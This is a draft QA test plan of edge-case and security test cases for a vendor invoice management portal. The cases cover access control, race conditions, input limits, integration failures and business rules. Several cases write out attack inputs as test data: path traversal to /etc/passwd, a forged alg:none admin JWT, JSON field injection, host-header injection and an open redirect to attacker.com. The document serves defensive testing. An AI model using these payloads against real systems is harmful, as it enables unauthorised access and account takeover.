### TC-EX-090 — Path Traversal in Resource URL

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018 |

**Test Data:**
- `GET /api/invoices/../../../etc/passwd`
- `GET /api/invoices/%2F..%2F..%2Fadmin%2Fusers`

**Steps:**
1. Send path traversal requests with vendor token
2. Try URL-encoded variants (`%2F`, `%5C`)

**Expected Result:**
- HTTP 400 or 404 for all path traversal attempts
- Server normalises URL paths before routing; no filesystem access
- No file system contents returned
- No admin data returned via traversal

---

### TC-EX-091 — Sequential Invoice ID Enumeration (BOLA / IDOR)

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018, BR-VIMP-007 |

**Precondition:** Vendor A knows their invoice ID is `INV-0100`. System uses sequential IDs.

**Test Data:** Vendor A enumerates `INV-0099`, `INV-0101`, `INV-0102`, etc.

**Steps:**
1. Login as Vendor A
2. Make GET requests for invoice IDs one above and below their known IDs
3. Try 20 sequential IDs around their own

**Expected Result:**
- HTTP 403 or 404 for every invoice not belonging to Vendor A
- **No data leakage:** Response body contains zero invoice data for other vendors
- Response is identical for non-existent and unauthorised IDs — attacker cannot distinguish
- **Recommended mitigation verified:** Invoice IDs are UUID/random (not sequential) to prevent enumeration

---

### TC-EX-092 — HTTP Method Override Header (X-HTTP-Method-Override)

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018 |

**Test Data:**
```
GET /api/invoices/INV-0501/approve HTTP/1.1
X-HTTP-Method-Override: POST
Authorization: Bearer [vendor_token]
```

**Steps:**
1. Send a GET request with `X-HTTP-Method-Override: POST` header to the approve endpoint

**Expected Result:**
- HTTP 403 or 405 — method override not honoured
- Server does not treat the request as POST based on the override header
- Invoice status unchanged
- State-changing operations require the correct HTTP method AND correct role

---

### TC-EX-093 — JWT with `alg: none` (Algorithm Confusion Attack)

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018 |

**Test Data:** Crafted JWT: `eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOiIxIiwicm9sZSI6IkFQX0FETUlOIn0.` (alg=none, role=AP_ADMIN, no signature)

**Steps:**
1. Craft a JWT with `"alg": "none"` in the header, `"role": "AP_ADMIN"` in the payload, and no signature
2. Send this token in the Authorization header to an AP Admin endpoint

**Expected Result:**
- HTTP 401 — JWT library must reject `alg: none` tokens
- `alg: none` must be explicitly disabled in the JWT validation library configuration
- No AP Admin access granted

---

### TC-EX-094 — Vendor Attempts to Change Their Own Role via Profile API

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018, US-VIMP-019 |

**Test Data:** Vendor's PATCH `/api/users/me` payload: `{"role": "AP_ADMIN"}`

**Steps:**
1. Login as Vendor
2. Send `PATCH /api/users/me` with body `{"role": "AP_ADMIN"}`

**Expected Result:**
- HTTP 403 or: role field ignored (not writable by vendor)
- Vendor's role remains `VENDOR` in DB
- If any fields are updatable via profile API, `role` must be explicitly excluded from the allowed update fields
- `role` changes only via System Admin through a privileged endpoint

---

### TC-EX-095 — Clickjacking: Portal Embedded in iframe by Attacker

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI |
| Priority | P1 |
| Story | US-VIMP-018 |

**Steps:**
1. Create a simple HTML page that embeds the portal in an `<iframe src="https://vimp-portal.com/login">`
2. Load the attacker's page

**Expected Result:**
- Portal login page does NOT render inside the iframe
- Browser respects one of:
  - Response header `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`
  - Response header `Content-Security-Policy: frame-ancestors 'none'`
- The portal cannot be used as a transparent overlay for UI-redressing attacks

---

## Module 8 — Concurrency & Race Conditions

---

### TC-EX-100 — Concurrent Status Updates to Same Invoice

| Field | Value |
|-------|-------|
| Type | C |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-010, US-VIMP-011 |

**Precondition:** Invoice `INV-RACE-001` in SUBMITTED status. Two AP Users ready.

**Steps:**
1. AP User 1 sends POST `/api/invoices/INV-RACE-001/approve`
2. Simultaneously, AP User 2 sends POST `/api/invoices/INV-RACE-001/reject` with reason "Duplicate PO"

**Expected Result:**
- Exactly ONE operation succeeds (database row-level lock or optimistic concurrency check)
- The other returns HTTP 409: "Invoice has been updated by another user. Please refresh."
- Invoice is in exactly one final state: either APPROVED or REJECTED — never both, never undefined
- **DB:** Single status value; `updated_at` timestamp consistent with the winning operation
- One audit entry for the actual transition

---

### TC-EX-101 — Vendor Deactivated While Invoice Submission Is In-Flight

| Field | Value |
|-------|-------|
| Type | C |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-005, BR-VIMP-002 |

**Steps:**
1. Vendor starts invoice submission (sends the HTTP request)
2. Simultaneously, System Admin deactivates the vendor account
3. Observe whether invoice is created

**Expected Result:**
- If account deactivation is processed before invoice creation: HTTP 403 — invoice not created
- If invoice creation completes first (within the same DB transaction): invoice created; vendor account deactivated separately — invoice remains SUBMITTED for AP to decide
- Under NO circumstances: invoice partially created (e.g., header without line items)
- The application must handle this race condition without a 500 error

---

### TC-EX-102 — Simultaneous PO Closure and Invoice Submission

| Field | Value |
|-------|-------|
| Type | C |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Steps:**
1. Thread A: Vendor submits invoice against PO-RACE-100
2. Thread B: AP Admin closes PO-RACE-100 (simultaneous)
3. Observe outcome

**Expected Result:**
- If PO is closed first: invoice submission fails with "PO no longer open"
- If invoice is created first: invoice is in SUBMITTED state referencing the now-closed PO; AP team must handle
- Either outcome is acceptable IF the DB state is consistent (no orphaned partial records)
- DB: PO closure and invoice submission use appropriate locking to prevent data inconsistency

---

### TC-EX-103 — Report Generation While Month's Invoices Are Being Submitted

| Field | Value |
|-------|-------|
| Type | C |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-017 |

**Steps:**
1. Begin generating the monthly report for the current month
2. Simultaneously submit 10 new invoices during report generation
3. Check whether the new invoices appear in the report

**Expected Result:**
- Report captures a consistent snapshot at the time generation begins (point-in-time read)
- Invoices submitted after report generation starts are either all included or all excluded — no partial inclusion
- No "dirty read" where the report sees some invoices mid-submission

---

## Module 9 — Data Boundary & Input Extremes

---

### TC-EX-110 — Whitespace-Only Input in Required Fields

| Field | Value |
|-------|-------|
| Type | N |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-001, US-VIMP-005 |

**Test Data:** Company Name = `   ` (3 spaces); Invoice Number = `\t\t` (tabs)

**Steps:**
1. Submit registration with Company Name = `   ` (spaces only)
2. Submit invoice with Invoice Number = `   ` (spaces only)

**Expected Result:**
- Both rejected as if the field were empty
- Server-side trim + validate: after trimming, if field is empty → "This field is required"
- Not sufficient to validate only on client side; whitespace bypass via API must also be blocked
- **DB:** No record with whitespace-only required fields

---

### TC-EX-111 — Null Values in API Payload for Required Fields

| Field | Value |
|-------|-------|
| Type | N |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-001, US-VIMP-005 |

**Test Data:**
```json
{
  "company_name": null,
  "email": "vendor@test.com",
  "password": "Secure@123"
}
```

**Steps:**
1. POST `/api/register` with `company_name: null`

**Expected Result:**
- HTTP 422: `{"error": "company_name is required and cannot be null"}`
- Distinction between null and missing field is important — both must be rejected
- No NullPointerException or 500 error

---

### TC-EX-112 — Very Long String in Non-Limited Text Field

| Field | Value |
|-------|-------|
| Type | B |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-005 |

**Test Data:** Line item description = 65,536 characters (64 KB string of 'A's)

**Steps:**
1. Submit invoice with a line item description of 65,536 chars via API

**Expected Result:**
- HTTP 422: "Description exceeds maximum allowed length of [N] characters."
- **OR:** Accepted if the field has no documented limit — but then stored correctly in DB (no truncation, no corruption)
- No DB column overflow (VARCHAR column must be adequately sized or validated)

---

### TC-EX-113 — JSON Injection in API Payload

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-005 |

**Test Data:**
```json
{
  "invoice_number": "INV-001\",\"status\":\"APPROVED",
  "po_number": "PO-100",
  "amount": 50000
}
```

**Steps:**
1. POST `/api/invoices` with the above payload

**Expected Result:**
- Invoice number stored as the literal string `INV-001","status":"APPROVED`
- The injected `"status":"APPROVED"` has NO effect on the invoice's actual status
- Invoice created with status `SUBMITTED` (the system-assigned initial status)
- Parameterised queries / proper JSON parsing prevent injection

---

### TC-EX-114 — Extremely Deep Nested JSON (100 Levels)

| Field | Value |
|-------|-------|
| Type | S + P |
| Layer | API |
| Priority | P2 |
| Story | US-VIMP-005 |

**Test Data:**
```json
{"a": {"a": {"a": {"a": {"a": ... }}}} // 100 levels deep
```

**Steps:**
1. POST `/api/invoices` with a 100-level nested JSON payload

**Expected Result:**
- HTTP 400: "Request payload is malformed or exceeds nesting limits."
- Server rejects deeply nested JSON before full parsing (to prevent stack overflow / ReDoS)
- No 500 error; no server crash

---

### TC-EX-115 — Invalid UTF-8 Byte Sequences in Request Body

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-005 |

**Test Data:** Raw POST body containing invalid UTF-8 bytes (e.g., `0xFF 0xFE` sequence in middle of a JSON string value)

**Steps:**
1. Send POST `/api/invoices` with an invalid UTF-8 sequence embedded in the invoice number field

**Expected Result:**
- HTTP 400: "Request body contains invalid character encoding."
- Server rejects the request without attempting to parse the invalid bytes
- No garbled data stored; no silent corruption

---

### TC-EX-116 — Oversized Request Body (>100 MB)

| Field | Value |
|-------|-------|
| Type | S + P |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-005, US-VIMP-006 |

**Test Data:** POST body of 100 MB (padding with large invoice line items array)

**Steps:**
1. Send POST `/api/invoices` with a 100 MB body

**Expected Result:**
- HTTP 413 Request Entity Too Large
- Server rejects the request at the request parsing layer — does not read all 100 MB into memory
- Configurable max body size (e.g., 10 MB) enforced at reverse proxy or application level

---

## Module 10 — Integration Failure Scenarios

---

### TC-EX-120 — Payment System Returns Unknown Status Code (e.g., 418 I'm a Teapot)

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | INT |
| Priority | P2 |
| Story | US-VIMP-013 |

**Precondition:** Payment system mock returns HTTP 418.

**Steps:**
1. Approve invoice
2. Payment system mock returns 418 (unexpected, non-standard)

**Expected Result:**
- System treats any non-200/201 response as a failure
- Invoice status = `PENDING_PAYMENT_FORWARDING`
- Error logged: "Payment system returned unexpected status 418; treating as failure"
- AP Admin alerted
- No assumption that "success" = only 200; any unexpected code = failure

---

### TC-EX-121 — Email Service Permanently Rejects Address (550 User Unknown)

| Field | Value |
|-------|-------|
| Type | N |
| Layer | INT |
| Priority | P2 |
| Story | US-VIMP-015 |

**Precondition:** Vendor's registered email results in `550 No such user here` from mail server.

**Steps:**
1. Trigger a status change notification for a vendor with a bouncing email
2. Email service mock returns `550 User Unknown`

**Expected Result:**
- Notification marked as permanently failed (no retry — 550 is permanent)
- Error logged: "Permanent delivery failure for vendor [id]: [email]. Notification cannot be delivered."
- AP Admin alerted
- Vendor account flagged for email update
- System does NOT retry permanently bounced addresses (wasteful and against best practices)

---

### TC-EX-122 — SSO Provider Returns Expired SAML Assertion

| Field | Value |
|-------|-------|
| Type | N |
| Layer | INT |
| Priority | P1 |
| Story | US-VIMP-003, OQ-13 |

**Precondition:** SSO configured for internal users. SAML assertion mock generates an expired assertion (NotOnOrAfter in the past).

**Steps:**
1. Internal AP User attempts login via SSO
2. IdP mock returns a SAML assertion with `NotOnOrAfter = [5 minutes ago]`

**Expected Result:**
- HTTP 401 / login page error: "Authentication failed. Your login session has expired. Please try again."
- Expired SAML assertion is NOT accepted
- No portal session created
- SAML validation must check `NotOnOrAfter` condition strictly

---

### TC-EX-123 — Notification Service Delivers Message Out of Order

| Field | Value |
|-------|-------|
| Type | E |
| Layer | INT |
| Priority | P3 |
| Story | US-VIMP-015 |

**Scenario:** Due to a queue retry, the "Invoice Approved" email arrives before the "Invoice Submitted" email for the AP team.

**Steps:**
1. Invoice submitted (notification to AP queued)
2. Invoice immediately approved (notification to AP queued — approved notification retried faster)
3. AP team receives "Invoice Approved" email before "Invoice Submitted" email

**Expected Result:**
- Both emails arrive eventually
- Portal state is the source of truth; email ordering does not affect invoice status
- AP team can ignore the out-of-order email anomaly — the portal always shows correct status
- Documented behaviour: email notifications are at-least-once delivery; portal is authoritative

---

### TC-EX-124 — Payment Callback Arrives for Unknown Invoice ID

| Field | Value |
|-------|-------|
| Type | N + S |
| Layer | INT + API |
| Priority | P1 |
| Story | US-VIMP-013 |

**Test Data:** Payment system sends a callback webhook: `{"invoice_id": "INV-NONEXISTENT", "status": "paid"}`

**Steps:**
1. Payment system mock sends a callback for an invoice that doesn't exist in VIMP

**Expected Result:**
- HTTP 404 returned to payment system
- No phantom invoice created
- Error logged: "Received payment callback for unknown invoice INV-NONEXISTENT. Ignoring."
- No state corruption
- Alert raised to AP Admin if the volume of unknown callbacks exceeds a threshold

---

### TC-EX-125 — Payment System Sends Callback Twice for Same Invoice

| Field | Value |
|-------|-------|
| Type | E |
| Layer | INT + DB |
| Priority | P1 |
| Story | US-VIMP-013 |

**Steps:**
1. Invoice approved; forwarding succeeds; payment system sends callback: payment completed
2. Invoice status → `PAYMENT_COMPLETED`
3. Payment system sends the same callback again (duplicate delivery)

**Expected Result:**
- Second callback acknowledged (HTTP 200 to payment system — do not retry)
- Invoice status remains `PAYMENT_COMPLETED` — not duplicated, not changed
- No second "Payment Completed" email to vendor
- Idempotency: same callback processed only once
- **DB:** Single `PAYMENT_COMPLETED` audit entry regardless of how many times callback received

---

## Module 11 — Non-Functional Extremes

---

### TC-EX-130 — Memory Leak Detection During Soak Test (72 Hours)

| Field | Value |
|-------|-------|
| Type | P (Reliability) |
| Layer | System |
| Priority | P2 |
| Story | Non-functional |

**Precondition:** Portal deployed to staging. JMeter soak test configured at 50 concurrent users.

**Test Data:** Simulated steady-state: 10 invoice submissions/min, 5 approvals/min, 1 report download/hour

**Steps:**
1. Start soak test — 50 concurrent users for 72 continuous hours
2. Monitor: JVM heap (if Java), Node.js memory (if Node), DB connection pool, disk usage
3. Capture memory/CPU graph at hours 1, 12, 24, 48, 72

**Expected Result:**
- Memory usage remains stable (does not continuously grow over 72 hours)
- No OutOfMemoryError or process crash
- DB connection pool does not leak (connections returned to pool after each request)
- Response time at hour 72 is within 20% of response time at hour 1
- System uptime ≥ 99.5% (max 21.6 minutes downtime over 72 hours)

---

### TC-EX-131 — Open Redirect via ReturnUrl Parameter

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-018 |

**Test Data:** `GET /login?returnUrl=https://attacker.com/steal-credentials`

**Steps:**
1. Construct login URL with `returnUrl=https://attacker.com`
2. Login successfully
3. Observe redirect destination

**Expected Result:**
- After login, the system does NOT redirect to `https://attacker.com`
- Either: returnUrl is validated against an allowlist of internal paths only; external URLs rejected
- Fallback: redirect always goes to `/dashboard` if returnUrl is external
- No open redirect vulnerability — this could be exploited for phishing

---

### TC-EX-132 — Host Header Injection

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-018 |

**Test Data:**
```
POST /api/auth/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@testco.com"}
```

**Steps:**
1. Send forgot-password request with Host header set to `attacker.com`
2. Check the password reset link sent to `victim@testco.com`

**Expected Result:**
- Password reset email link uses the server's actual configured domain, NOT the Host header value
- Link = `https://vimp-portal.com/reset-password?token=...` (NOT `https://attacker.com/reset-password?...`)
- Host header value is NOT trusted for generating URLs — URL base is hardcoded from server configuration

---

### TC-EX-133 — Accessibility: Form Error Recovery via Keyboard Only

| Field | Value |
|-------|-------|
| Type | Accessibility |
| Layer | UI |
| Priority | P2 |
| Story | US-VIMP-001, Non-functional |

**Steps:**
1. Navigate to registration form using Tab key only (no mouse)
2. Submit the form with empty required fields
3. Observe where focus moves after validation errors appear
4. Correct the errors using keyboard only
5. Submit successfully

**Expected Result:**
- Focus moves to the first error field (or to a summary of errors) after failed submission — screen reader users are informed
- Error messages are announced by screen reader (ARIA `role="alert"` or `aria-live`)
- User can correct all errors and submit successfully without using a mouse
- No keyboard trap anywhere in the form

---

### TC-EX-134 — Verify No Sensitive Data in Browser's Local Storage / Session Storage

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI |
| Priority | P1 |
| Story | US-VIMP-002 |

**Steps:**
1. Login as a vendor
2. Open browser devtools → Application → Local Storage and Session Storage
3. Inspect all stored values

**Expected Result:**
- No passwords stored in any client storage
- No full JWT tokens stored in localStorage (XSS-accessible) — tokens must be in HttpOnly cookies
- No personally identifiable information (PII) stored in localStorage
- Acceptable: non-sensitive settings (e.g., user's UI preference for table column order)

---

### TC-EX-135 — Verify HTTPS Enforcement and HSTS Header

| Field | Value |
|-------|-------|
| Type | S |
| Layer | Network |
| Priority | P1 |
| Story | Non-functional (Security) |

**Steps:**
1. Attempt to access `http://vimp-portal.com` (HTTP, not HTTPS)
2. Inspect login response headers for HSTS

**Expected Result:**
- **Step 1:** HTTP 301/302 redirect to `https://vimp-portal.com` — no content served over plain HTTP
- **HSTS header present:** `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- Browser will not allow HTTP connections after first HTTPS visit
- This prevents SSL-stripping attacks

---

### TC-EX-136 — Content Security Policy (CSP) Header Prevents Inline Scripts

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI |
| Priority | P1 |
| Story | Non-functional (Security) |

**Steps:**
1. Load any portal page
2. Inspect the `Content-Security-Policy` response header
3. Attempt to inject inline script via URL or form field

**Expected Result:**
- CSP header present and restrictive: at minimum `default-src 'self'; script-src 'self'` — no `'unsafe-inline'`
- Inline `<script>` tags blocked by browser CSP
- External scripts from untrusted domains blocked
- `eval()` use blocked (`'unsafe-eval'` not in policy)

---

## Module 12 — Business Logic Extremes

---

### TC-EX-140 — Invoice Amount Exactly Equals PO Remaining Value

| Field | Value |
|-------|-------|
| Type | B |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Precondition:** PO-EXACT-100 has a total value of ₹100,000 and no prior invoices against it (remaining = ₹100,000).

**Test Data:** Invoice amount = ₹100,000.00 (exactly matches PO value)

**Steps:**
1. Submit invoice for ₹100,000 against PO-EXACT-100

**Expected Result:**
- Invoice accepted — full PO value invoiced is valid
- After submission, PO-EXACT-100 remaining value = ₹0.00
- PO status may change to "Fully Invoiced" or remain "Open" — per business rule (must be documented)
- No error about "over-invoicing"

---

### TC-EX-141 — Invoice Amount Exceeds PO Value (Over-Invoicing)

| Field | Value |
|-------|-------|
| Type | N + B |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Precondition:** PO-EXACT-100 has remaining value ₹100,000.

**Test Data:** Invoice amount = ₹100,000.01 (1 paise over)

**Steps:**
1. Submit invoice for ₹100,000.01 against PO-EXACT-100

**Expected Result:**
- One of two behaviours (must be documented per business rule):
  - **(a) Hard block:** "Invoice amount exceeds PO remaining value. Max allowed: ₹100,000.00"
  - **(b) Warning/flag:** Invoice accepted but flagged for AP review with: "⚠ Invoice amount exceeds PO value. Please review before approving."
- Either is acceptable IF consistent — the test verifies the system handles this and does not silently allow over-invoicing

---

### TC-EX-142 — Submit Invoice for Fully-Invoiced PO (Second Invoice After Full First)

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Precondition:** PO-FULL-200 had ₹50,000 value; vendor previously submitted and got approved for the full ₹50,000.

**Steps:**
1. Vendor submits a second invoice against PO-FULL-200 for ₹1,000

**Expected Result:**
- One of:
  - **(a) Blocked:** "PO-FULL-200 has been fully invoiced. No further invoices can be submitted."
  - **(b) Allowed with warning:** Second invoice flagged for AP review as potential over-invoicing
- System does NOT silently accept a second full invoice against the same PO

---

### TC-EX-143 — Resubmit Rejected Invoice with Same Invoice Number

| Field | Value |
|-------|-------|
| Type | E |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-008 |

**Precondition:** Invoice `INV-2024-REJ-001` was rejected; vendor wants to resubmit with corrections.

**Steps:**
1. Vendor resubmits with the same invoice number `INV-2024-REJ-001` and same PO (corrected amount)

**Expected Result:**
- Resubmission accepted (rejected invoices are exempt from duplicate check for the same invoice number — they are corrections, not duplicates)
- New record created with status `SUBMITTED`; original rejected invoice marked with status `SUPERSEDED` or remains `REJECTED`
- Full history maintained: both original and resubmission visible in audit trail
- Duplicate check does NOT block legitimate resubmissions of rejected invoices

---

## Test Case Summary

| Module | Extreme TC Count | Types Covered |
|--------|-----------------|---------------|
| Authentication & Registration | 10 (TC-EX-001–010) | Unicode, max-length, race conditions, token replay, cookie security |
| Invoice Submission | 15 (TC-EX-020–034) | File extremes, concurrency, injection, business logic |
| AP Approval & Rejection | 8 (TC-EX-040–047) | Load, race condition, network failure, Unicode, HTTP verbs, last-admin |
| Payment Forwarding | 4 (TC-EX-060–063) | Malformed response, duplicate refs, timeout, concurrent approvals |
| Notifications | 3 (TC-EX-070–072) | Rate limiting, special chars, email change during queue |
| Monthly Reports | 4 (TC-EX-080–083) | Future month, midnight boundary, DST, concurrent downloads |
| RBAC & Security | 6 (TC-EX-090–095) | Path traversal, IDOR, method override, JWT alg:none, role escalation, clickjacking |
| Concurrency & Race Conditions | 4 (TC-EX-100–103) | Status conflicts, deactivation in-flight, PO closure, report during write |
| Data Boundary & Input Extremes | 7 (TC-EX-110–116) | Whitespace, null, long strings, JSON injection, deep nesting, invalid UTF-8, oversized body |
| Integration Failures | 6 (TC-EX-120–125) | Unknown status codes, permanent bounce, expired SAML, out-of-order events, unknown callback, duplicate callback |
| Non-Functional Extremes | 7 (TC-EX-130–136) | Soak/memory leak, open redirect, host header injection, accessibility, localStorage, HTTPS/HSTS, CSP |
| Business Logic Extremes | 4 (TC-EX-140–143) | Exact PO match, over-invoicing, fully-invoiced PO, resubmit rejected |
| **TOTAL** | **78 extreme/edge test cases** | **All layers: UI, API, DB, INT** |

---

*Document version: 1.0 | Status: Draft*  
*Complements `04_test_plan.md` (standard test cases). Together: ~360 total test cases.*
